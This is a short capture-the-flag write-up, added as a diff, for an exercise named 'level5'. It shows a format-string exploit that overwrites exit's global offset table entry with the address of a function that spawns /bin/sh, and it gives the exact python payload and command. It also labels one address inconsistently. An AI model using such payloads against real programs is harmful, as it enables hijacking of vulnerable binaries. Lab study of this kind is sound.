@@ -1,0 +1,12 @@
+With objdump -t we can see a "o" function. This function call /bin/sh.
+Like in the last exercise we use format string exploit to redirect the return value of the exit 
+function present in the global offset table to the address of the "o" function.
+
+objdump -R to get the got address of exit.
+
+We split the address of exit (0x080484a4):
+0804 = 2052 (in decimal) - 8 (because we already wrote 8 bytes with addresses)
+84a4 = 33956 (in decimal) - 2052 = 31904
+
+$> python -c 'print "\x3a\x98\x04\x08\x38\x98\x04\x08%2044x%4$hn%31904x%5$hn"' > /tmp/exploit
+$> cat /tmp/exploit - | ./level5
